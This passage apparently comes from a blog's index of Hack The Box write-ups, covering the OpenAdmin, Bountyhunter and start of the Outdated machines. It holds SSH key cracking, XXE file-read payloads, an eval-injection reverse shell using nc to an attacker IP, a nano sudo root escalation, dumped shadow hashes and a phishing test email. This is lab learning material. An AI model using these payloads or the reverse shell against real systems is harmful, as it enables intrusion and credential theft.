y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI\n   9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4\n   piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/\n   /U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH\n   40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ\n   fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb\n   9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80\n   X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg\n   S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F\n   FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh\n   Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa\n   RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z\n   uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr\n   1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2\n   XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79\n   yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM\n   +4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt\n   qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt\n   z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe\n   K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN\n   -----END RSA PRIVATE KEY-----\n   \n\n\nDon’t forget your “ninja” password\n\nClick here to logout Session\n\nmain.php runs the command ‘cat /home/joanna/.ssh/id_rsa’ meaning we just got joanna’s private ssh key.\n\nTrying to login with the extracted private key requires an passphrase key, so we need to crack it. The key is in .pem format so before cracking we need to convert it using ssh2john.\nroot@p3:/usr/share/john# python ssh2john.py /opt/htb/machines/openadmin/joanna-id_rsa &gt; /opt/htb/machines/openadmin/hash-joanna root@p3:/opt/htb/machines/openadmin# john –wordlist=/usr/share/wordlists/rockyou.txt hash-joanna Using default input encoding: UTF-8 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 12 OpenMP threads Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Press ‘q’ or Ctrl-C to abort, almost any other key for status bloodninjas (/opt/htb/machines/openadmin/joanna-id_rsa) 1g 0:00:00:01 DONE (2020-01-07 14:43) 0.5882g/s 8436Kp/s 8436Kc/s 8436KC/s 0125457423 ..*7¡Vamos! Session completed\nPassword for Joanna’s Private Key: bloodninjas\nLogin as Joanna and grab user.txt root@p3:/opt/htb/machines/openadmin# ssh joanna@openadmin.htb -i joanna-id_rsa Enter passphrase for key ‘joanna-id_rsa’: bloodninjas joanna@openadmin:~$ cat user.txt c9b2****************************\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nsudo -l shows us that we can run “sudo /bin/nano /opt/priv” without any password. Looking at gtfobins there is a privesc using nano to get a root shell.\njoanna@openadmin:/opt$ sudo /bin/nano /opt/priv Press CTRL + R to for “Read File” and then CTRL + X for “Execute Command”. Next, write ‘reset; sh 1&gt;&0 2&gt;&0’ to get shell\nCommand to execute: reset; sh 1&gt;&0 2&gt;&0 # # # whoami root # cat /root/root.txt 2f90****************************\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nOpenNetAdmin 18.1.1 RCE https://packetstormsecurity.com/files/155406/OpenNetAdmin-18.1.1-Remote-Code-Execution.html\nGTFOBINS Nano https://gtfobins.github.io/gtfobins/nano/#sudo"
  },
  {
    "objectID": "posts/2021-08-13-htb-writeup-bountyhunter/2021-08-13-htb-writeup-bountyhunter.html",
    "href": "posts/2021-08-13-htb-writeup-bountyhunter/2021-08-13-htb-writeup-bountyhunter.html",
    "title": "Bountyhunter - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\n[root:/git/htb/bountyhunter]# nmap -Pn -n -sCV 10.10.11.100 –open (master✱) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA) | 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA) |_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Bounty Hunters Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nDIRB: ==&gt; DIRECTORY: http://10.10.11.100/assets/ ==&gt; DIRECTORY: http://10.10.11.100/css/ + http://10.10.11.100/index.php (CODE:200|SIZE:25169) ==&gt; DIRECTORY: http://10.10.11.100/js/ ==&gt; DIRECTORY: http://10.10.11.100/resources/ + http://10.10.11.100/server-status (CODE:403|SIZE:277)\nNIKTO: + Server: Apache/2.4.41 (Ubuntu) + OSVDB-3093: /db.php: This might be interesting… has been seen in web logs from an unknown scanner.\n\nVisiting the webpage we find a Portal tab, press it and we find that portal.php is under development but a test page has been setup at log_submit.php. Trying to submit a bounty, and capturing the POST in Burp we find that all data are encoded.\n\nPOST REQUEST: POST /tracker_diRbPr00f314.php HTTP/1.1 Host: 10.10.11.100 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: / Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 227 Origin: http://10.10.11.100 Connection: close Referer: http://10.10.11.100/log_submit.php\ndata=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5UZXN0PC90aXRsZT4KCQk8Y3dlPlRFU1QgQ1dFPC9jd2U%2BCgkJPGN2c3M%2BMTA8L2N2c3M%2BCgkJPHJld2FyZD4xMDAwPC9yZXdhcmQ%2BCgkJPC9idWdyZXBvcnQ%2B\nNotice that there are % in the encoded data, this is URL-encoded and below that base64. So deocde URL -&gt; decode base64 and we are left with our data:\nORIGINAL DATA  \n\nTest Title\n\n    &lt;cwe&gt;TEST CWE&lt;/cwe&gt;\n    &lt;cvss&gt;10&lt;/cvss&gt;\n    &lt;reward&gt;1000&lt;/reward&gt;\n    &lt;/bugreport&gt;\nWe can clearly see that this is XML and should therefore investigate the possibility of XXE attacks. I usually like to test with a simple Read File XXE POC. Below is the code needed to read /etc/passwd:  &lt;!DOCTYPE foo [&lt;!ENTITY example SYSTEM “/etc/passwd”&gt; ]&gt; &example;\nLets add this to our XML data, base64 encode and then urlencode.\nMALICIOUS XXE DATA  &lt;!DOCTYPE foo [&lt;!ENTITY example SYSTEM “/etc/passwd”&gt; ]&gt; \n\n&example;\n\n    &lt;cwe&gt;TEST CWE&lt;/cwe&gt;\n    &lt;cvss&gt;10&lt;/cvss&gt;\n    &lt;reward&gt;1000&lt;/reward&gt;\n    &lt;/bugreport&gt;\nHTTP RESPONSE:\n\nTitle:\n\n\nroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin development:x:1000:1000:Development:/home/development:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\n\nIt works as intended, we have file read!\n\nAs usual with LFI’s we need to find the right file. Scavenging through different known sensitive files gives nothing, so my next thought was to go through web-files - but we don’t know the absolute path..\n\nAfter some googling I found that you’re able to extract files from the folder you are in, using following output: &lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM “php://filter/convert.base64-encode/resource=index.php”&gt; ]&gt;\nSo with this knowledge we can try and grab ‘db.php’ that we found previously and hope to find any db creds and password reuse.\nMALICIOUS PAYLOAD:  &lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM “php://filter/convert.base64-encode/resource=db.php”&gt; ]&gt; \n\n&xxe;\n\n    &lt;cwe&gt;TEST CWE&lt;/cwe&gt;\n    &lt;cvss&gt;10&lt;/cvss&gt;\n    &lt;reward&gt;1000&lt;/reward&gt;\n    &lt;/bugreport&gt;\nAs before, base64 encode and then urlencode. Sending the data and we get a reply with: PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=\nDecoding it:  Implement login system with the database. \\(dbserver = \"localhost\";\\)dbname = “bounty”; \\(dbusername = \"admin\";\\)dbpassword = “m19RoAU0hP41A1sTsq6K”; $testuser = “test”; ?&gt;\nYES SOME CREDS! From grabbing /etc/passwd earlier we saw that user development was present.\n[root:/git/htb/bountyhunter]# ssh development@bountyhunter.htb development@bountyhunter.htb’s password: m19RoAU0hP41A1sTsq6K Last login: Wed Jul 21 12:04:13 2021 from 10.10.14.8 development@bountyhunter:~$ id && hostname uid=1000(development) gid=1000(development) groups=1000(development) bountyhunter development@bountyhunter:~$ cat user.txt d3ff041dcea82a5839bbfa0e7d75a80f\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nIn /home/development we find a file, contract.txt: development@bountyhunter:~$ cat contract.txt Hey team,\nI’ll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.\nThis has been our first job since the “rm -rf” incident and we can’t mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.\nI set up the permissions for you to test this. Good luck.\n– John\n\ndevelopment@bountyhunter:/opt/skytrain_inc/invalid_tickets$ sudo -l Matching Defaults entries for development on bountyhunter: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin\nUser development may run the following commands on bountyhunter:\n    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py\nLooking at the script: development@bountyhunter:/dev/shm$ cat /opt/skytrain_inc/ticketValidator.py #Skytrain Inc Ticket Validation System 0.1 #Do not distribute this file.\ndef load_file(loc):\n    if loc.endswith(\".md\"):\n        return open(loc, 'r')\n    else:\n        print(\"Wrong file type.\")\n        exit()\n\ndef evaluate(ticketFile):\n    #Evaluates a ticket to check for ireggularities.\n    code_line = None\n    for i,x in enumerate(ticketFile.readlines()):\n        if i == 0:\n            if not x.startswith(\"# Skytrain Inc\"):\n                return False\n            continue\n        if i == 1:\n            if not x.startswith(\"## Ticket to \"):\n                return False\n            print(f\"Destination: {' '.join(x.strip().split(' ')[3:])}\")\n            continue\n\n        if x.startswith(\"__Ticket Code:__\"):\n            code_line = i+1\n            continue\n\n        if code_line and i == code_line:\n            if not x.startswith(\"**\"):\n                return False\n            ticketCode = x.replace(\"**\", \"\").split(\"+\")[0]\n            if int(ticketCode) % 7 == 4:\n                validationNumber = eval(x.replace(\"**\", \"\"))\n                if validationNumber &gt; 100:\n                    return True\n                else:\n                    return False\n    return False\n\ndef main():\n    fileName = input(\"Please enter the path to the ticket file.\\n\")\n    ticket = load_file(fileName)\n    #DEBUG print(ticket)\n    result = evaluate(ticket)\n    if (result):\n        print(\"Valid ticket.\")\n    else:\n        print(\"Invalid ticket.\")\n    ticket.close\n\nmain()\nIn the script we can find an obvious vulnerable eval-function on line 34. Looking through the script there are a few pointers that need to be met. 1. Ticket file ends with .md 2. Content of ticket file starts with ‘# Skytrain Inc’ 3. Line two starts with ‘## Ticket to’ 4. Third line ‘Ticket Code:’ - notice the capital T and C. 5. The calculation should in the end yield mod 7 = 4. (11+321+1 mod 7 = 4)\nBelow is a valid ticket. [root:/git/htb/bountyhunter]# cat 600939065.md (master✱) # Skytrain Inc ## Ticket to Essex Ticket Code: 11+321+1 ##Issued: 2021/05/12 #End Ticket\n[root:/git/htb/bountyhunter]# python3 exp.py (master✱) Please enter the path to the ticket file. 600939065.md Destination: Essex Valid ticket.\n\nIf I’m understanding correct, the calculations are passed to the eval-function. Instead of the calculation, we should be able to inject python code and from there get code execution / reverse shell - as long as mod 7 = 4.\n\ndevelopment@bountyhunter:/opt/skytrain_inc$ cat /dev/shm/ticket.md # Skytrain Inc ## Ticket to Root Ticket Code: **11+import(‘os’).system(‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&1|nc 10.10.14.4 4488 &gt;/tmp/f’) ##Issued: 2021/05/12 #End Ticket\ndevelopment@bountyhunter:/opt/skytrain_inc$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py Please enter the path to the ticket file. /dev/shm/ticket.md Destination: Root rm: cannot remove ‘/tmp/f’: No such file or directory\n[root:/git/htb/bountyhunter]# nc -lvnp 4488 (master✱) listening on [any] 4488 … connect to [10.10.14.4] from (UNKNOWN) [10.10.11.100] 49774 # id uid=0(root) gid=0(root) groups=0(root) # cat /root/root.txt 65d583629b3a54070bb6b26f1f08915f\n# cat /etc/shadow root:\\(6\\)S6D08T6aUYoEjKkH$aL7HVCr1HUlObuXmxFaXrmYgO3Bn0DwYnefBPI/ATF/At/0eplm9xBfsRoFo8NnlWFeIBzmBivxSfFtAUyfp9.:18793:0:99999:7::: development:\\(6\\)Icvq5CG9C3uVjeoJ$OCBFhlmlWWblwxPMj.LjvpuV49flCSkTiszqThdLwJ.eqWtOSgSAhjRXAzQTnQyn0tuYlYyQPbqupz4Jq85wM/:18793:0:99999:7:::\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nXXE Read File: https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#main-attacks\nXXE PHP Wrappers: https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#utf-7"
  },
  {
    "objectID": "posts/2022-08-22-htb-writeup-outdated/2022-08-22-htb-writeup-outdated.html",
    "href": "posts/2022-08-22-htb-writeup-outdated/2022-08-22-htb-writeup-outdated.html",
    "title": "Outdated - Hack The Box",
    "section": "",
    "text": "nmap:\n➜  outdated nmap -Pn -n -v -p- 10.10.11.175 --open\nPORT      STATE SERVICE\n25/tcp    open  smtp\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n8530/tcp  open  unknown\n8531/tcp  open  unknown\n9389/tcp  open  adws\n49667/tcp open  unknown\n49669/tcp open  unknown\n49670/tcp open  unknown\n49672/tcp open  unknown\n49884/tcp open  unknown\n49903/tcp open  unknown\n49917/tcp open  unknown\n\n➜  outdated nmap -Pn -n -sCV -p 25,53,135,139,389,445,464,593,636,3268,3269,5985,8530,8531,9389,49667,49669,49670,49672,49884,49903,49917 10.10.11.175\nPORT      STATE SERVICE       VERSION\n25/tcp    open  smtp          hMailServer smtpd\n| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP\n|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY\n53/tcp    open  domain        Simple DNS Plus\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2022-08-15T14:52:47+00:00; +7h00m01s from scanner time.\n| ssl-cert: Subject: \n| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED\n| Not valid before: 2022-06-18T05:50:24\n|_Not valid after:  2024-06-18T06:00:24\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: \n| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED\n| Not valid before: 2022-06-18T05:50:24\n|_Not valid after:  2024-06-18T06:00:24\n|_ssl-date: 2022-08-15T14:52:47+00:00; +7h00m01s from scanner time.\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2022-08-15T14:52:47+00:00; +7h00m01s from scanner time.\n| ssl-cert: Subject: \n| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED\n| Not valid before: 2022-06-18T05:50:24\n|_Not valid after:  2024-06-18T06:00:24\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2022-08-15T14:52:47+00:00; +7h00m01s from scanner time.\n| ssl-cert: Subject: \n| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED\n| Not valid before: 2022-06-18T05:50:24\n|_Not valid after:  2024-06-18T06:00:24\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n8530/tcp  open  http          Microsoft IIS httpd 10.0\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: Site doesnt have a title.\n| http-methods: \n|_  Potentially risky methods: TRACE\n8531/tcp  open  unknown\n9389/tcp  open  mc-nmf        .NET Message Framing\n49667/tcp open  msrpc         Microsoft Windows RPC\n49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49670/tcp open  msrpc         Microsoft Windows RPC\n49672/tcp open  msrpc         Microsoft Windows RPC\n49884/tcp open  msrpc         Microsoft Windows RPC\n49903/tcp open  msrpc         Microsoft Windows RPC\n49917/tcp open  msrpc         Microsoft Windows RPC\nService Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s\n| smb2-security-mode: \n|   3.1.1: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2022-08-15T14:52:10\n|_  start_date: N/A\n\n\n➜  outdated sudo nmap -sU --top-port 100 10.10.11.175 --open\nPORT    STATE SERVICE\n123/udp open  ntp\n➜  outdated smbclient -L 10.10.11.175\nPassword for [WORKGROUP\\void]:\n\n    Sharename       Type      Comment\n    ---------       ----      -------\n    ADMIN$          Disk      Remote Admin\n    C$              Disk      Default share\n    IPC$            IPC       Remote IPC\n    NETLOGON        Disk      Logon server share \n    Shares          Disk      \n    SYSVOL          Disk      Logon server share \n    UpdateServicesPackages Disk      A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.\n    WsusContent     Disk      A network share to be used by Local Publishing to place published content on this WSUS system.\n    WSUSTemp        Disk      A network share used by Local Publishing from a Remote WSUS Console Instance.\n\n➜  outdated smbclient //10.10.11.175/Shares\nPassword for [WORKGROUP\\void]:\nsmb: \\&gt; ls\n  .                                   D        0  Mon Jun 20 17:01:33 2022\n  ..                                  D        0  Mon Jun 20 17:01:33 2022\n  NOC_Reminder.pdf                   AR   106977  Mon Jun 20 17:00:32 2022\n\n        9116415 blocks of size 4096. 1369832 blocks available\n\nsmb: \\&gt; get NOC_Reminder.pdf\ngetting file \\NOC_Reminder.pdf of size 106977 as NOC_Reminder.pdf (614.5 KiloBytes/sec) (average 614.5 KiloBytes/sec)\nIn the PDF we find information about a recent breach, where users are asked to mail information to itsupport@outdated.htb - this might be a good entrypoint for us using phising if we’re able to compromize the SMTP server or setup our own SMTP server.\n\nLets start by trying to setup a local SMTP server and mail a phishing/test link to itsupport. Before sending the email, make sure to start a local HTTP server to capture the request if itsupport clicks the link.\n➜  outdated apt install mailutils postfix\n➜  outdated sudo postconf -e \"mydestination = $myhostname, void, localhost.localdomain, localhost\"\n➜  outdated sudo postconf -e \"mynetworks = 127.0.0.0/8, 10.10.14.0/24\"\n➜  outdated sudo postconf -e \"inet_interfaces = all\"\n➜  outdated sudo postconf -e \"inet_protocols = ipv4\"\n➜  outdated sudo postconf -e \"recipient_delimiter = +\"\n➜  outdated sudo postconf -e \"lmtp_host_lookup = native\"\n➜  outdated sudo postconf -e \"smtp_host_lookup = native\"\n\n➜  outdated service postfix restart\n➜  outdated telnet localhost 25\n\n220 void.xxxxx.se ESMTP Postfix (Debian/GNU)\nehlo localhost\n250-void.xxxxx.se\n250-PIPELINING\n250-SIZE 10240000\n250-VRFY\n250-ETRN\n250-STARTTLS\n250-ENHANCEDSTATUSCODES\n250-8BITMIME\n250-DSN\n250-SMTPUTF8\n250 CHUNKING\nmail from: void@void\n250 2.1.0 Ok\nrcpt to: itsupport@outdated.htb\n250 2.1.5 Ok\ndata\n354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;\nSubject: Phishing\nhttp://10.10.14.6:8080\n.\n250 2.0.0 Ok: queued as 0C51812101C\nquit\n221 2.0.0 Bye\nVerify that the mail has been sent by looking at /var/log/mail.log and verify that it has status = sent.\n➜  outdated cat /var/log/mail.log\n[... snip ...]\nAug 15 10:51:28 void postfix/smtp[7917]: 0C51812101C: to=&lt;itsupport@outdated.htb&gt;, relay=outdated.htb[10.10.11.175]:25, delay=54, delays=43/0.01/0.08/11, dsn=2.0.0, status=sent (250 Queued (10.432 seconds))\nAlthough the mail is sent and nothing seems to be out of the ordinary, we don’t get anything back. Testing other transmitters we see that the mail bounces due to 500: Unknown user, if we had a list of potential users we could verify them this way.\nAug 15 10:58:37 void postfix/smtp[8307]: 7EEB6121020: to=&lt;0xpthree@outdated.htb&gt;, relay=outdated.htb[10.10.11.175]:25, delay=0.16, delays=0/0/0.09/0.07, dsn=5.0.0, status=bounced (host outdated.htb[10.10.11.175] said: 550 Unknown user (in reply to RCPT TO command))\n\nAug 15 11:00:20 void postfix/smtp[8325]: 90736121020: to=&lt;Administrator@outdated.htb&gt;, relay=outdated.htb[10.10.11.175]:25, delay=0.15, delays=0/0/0.08/0.06, dsn=5.0.0, status=bounced (host outdated.htb[10.10.11.175] said: 550 Unknown user (in reply to RCPT TO command))\n\n\n\nAt this point we have pretty much nothing, and since we don’t get any callbacks from SMTP it’s starting to feel like a rabbithole..\nWe can continue enumerating further to see if I missed something, we can use rpcclient to enumerate all users in the machine.\n## Find SID\n➜  outdated rpcclient -U \"\" 10.10.11.175    \nPassword for [WORKGROUP\\]:\nrpcclient $&gt; lookupnames Administrator\nAdministrator S-1-5-21-4089647348-67660539-4016542185-500 (User: 1)\n\n## Bruteforce to find all users\n➜  outdated for i in {1000..1200}; do rpcclient --command=\"lookupsids S-1-5-21-4089647348-67660539-4016542185-$i\" 10.10.11.175 -U \"\" --password=; done\n[... snip ...]\nS-1-5-21-4089647348-67660539-4016542185-1103 